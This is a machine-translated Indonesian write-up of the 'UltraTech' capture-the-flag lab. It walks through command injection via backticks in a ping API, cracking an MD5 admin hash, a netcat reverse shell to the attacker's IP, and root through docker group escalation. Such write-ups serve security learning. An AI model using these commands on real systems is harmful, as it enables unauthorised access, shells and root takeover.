---
title: "UltraTech"
description: "Enum Port 8081 - http Mengakses port 8081 Saya hanya mendapatkan ini UltraTech API v0.1.3 dirsearch kami tidak mendapatkan hal yang menarik juga Port 31331 - http mengakses port menggunakan browser karena layanan"
lang: "id"
translationKey: "ultratech"
category: "lab-writeups"
tags: ["Lab", "Command Injection", "Command Exploit", "docker group", "privesc-docker-group", "Linux", "Medium"]
publishDate: "2025-08-22"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "2575fca1-ed80-80fe-b3a6-cac5a5f836cb"
notionUrl: "https://app.notion.com/p/UltraTech-2575fca1ed8080feb3a6cac5a5f836cb"
notionLastEdited: "2025-08-24T14:11:00.000Z"
---

# Enum

![](/images/ultratech/ef76164b1b04.png)

![](/images/ultratech/f4308fd04343.png)

![](/images/ultratech/e367415b1a97.png)

## Port 8081 - http

Saat mengakses port 8081, saya hanya mendapatkan **UltraTech API v0.1.3**

![](/images/ultratech/f4624ad1b6c4.png)

Dirsearch kami juga tidak menemukan hal yang menarik.

![](/images/ultratech/e3268360ec37.png)

![](/images/ultratech/b40582fca7fc.png)

![](/images/ultratech/317a184c029c.png)

## Port 31331 - http

Mengakses port menggunakan browser menyebabkan layanan menggunakan protokol http.

![](/images/ultratech/22bd3eb7c186.png)

lalu kita melakukan Dirsearch

![](/images/ultratech/a85424aa5e42.png)

robots.txt

![](/images/ultratech/f5a3bfe6781c.png)

utech_sitemap.txt

![](/images/ultratech/2bc2db2d8b88.png)

mitra.html

![](/images/ultratech/a3013451ee0f.png)

halaman /js

![](/images/ultratech/72f20e9d5498.png)

### Injeksi Perintah

halaman /js/api.js

![](/images/ultratech/e90bdd157a7f.png)

ada halaman ping yang bisa kita coba ping [localhost](http://localhost/) & IP kita, kita mendapat respons yang baik

![](/images/ultratech/9c73838da74f.png)

![](/images/ultratech/5593bd942568.png)

lalu kami mencoba menjalankan perintah lain selain perintah ping saja, menggunakan ( ; ) tetapi gagal.

![](/images/ultratech/ad3a47418d8a.png)

Jadi, kami mencoba cara lain menggunakan backtricks ( ` ` ) untuk menjalankan perintah lain, misalnya menggunakan perintah ls kami mendapat respons seperti file

![](/images/ultratech/51b87cd3a815.png)

Mari kita periksa file apa itu. Setelah memeriksa file (utech.db.sqlite), kita mendapatkan hash admin.

![](/images/ultratech/7d1aee3dbb19.png)

Kami menduga itu adalah hash MD5, jadi mari kita coba memecahkannya menggunakan CrackStation.

![](/images/ultratech/af865897d5a7.png)

![](/images/ultratech/51b3ce61cbb5.png)

![](/images/ultratech/88d17ad17dd0.png)

lalu kami juga mencoba memecahkannya menggunakan John

![](/images/ultratech/3a3baff1d5b5.png)

![](/images/ultratech/2c8f41167150.png)

**Cara meretas menggunakan hashcat:**

```bash
hashcat -m 0 hash_md5 /usr/share/wordlists/rockyou.txt
```

![](/images/ultratech/403da019d2e8.png)

Voila, kita berhasil membobol kata sandi pengguna root (`r00t:n100906`)

![](/images/ultratech/611b63d3f960.png)

### RevShell melalui Injeksi Perintah

Saya tidak tahu mengapa, tetapi hanya payload ini yang akan berfungsi untuk membangun revshell.

![](/images/ultratech/a186251dd0f4.png)

```bash
busybox nc 10.17.49.139 4444 -e bash
```

![](/images/ultratech/f08d9eadd326.png)

Setelah mencari-cari, saya tidak menemukan file yang menarik di dalam direktori /home dan direktori pengguna, jadi saya kembali memeriksa file sqlite seperti yang kita lakukan pada langkah sebelumnya.

# LinPriv

biji rami:

![](/images/ultratech/f4030f431cf1.png)

Kita lihat kita berada di grup docker. Berada di grup docker adalah bagian penting, artinya pengguna Anda memiliki izin untuk menjalankan perintah Docker tanpa perlu sudo. Biasanya, hanya root yang dapat mengakses daemon Docker (/var/run/docker.sock), tetapi jika Anda ditambahkan ke grup docker, Anda dapat menjalankan perintah seperti docker ps secara langsung.

Berdasarkan gtfobin, kita bisa masuk sebagai pengguna root menggunakan Docker, jadi mari kita lakukan.

![](/images/ultratech/88110d0aa47b.png)

Kami gagal menjalankan perintah yang kami dapatkan dari gtfobin, pesan kesalahan memberi tahu kami bahwa "tidak dapat menemukan image alpine secara lokal", jadi kami berasumsi bahwa kami perlu mengetahui image apa yang ada di lokal kami dengan menjalankan perintah: `docker images`

![](/images/ultratech/319b7be69427.png)

kita hanya punya 1 gambar yaitu gambar bash

![](/images/ultratech/5617c3b71bff.png)

Jadi, sekali lagi mari kita modifikasi payload kita dan jalankan. Voila, kita mendapatkan akses root.

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

![](/images/ultratech/dbd004d153bf.png)
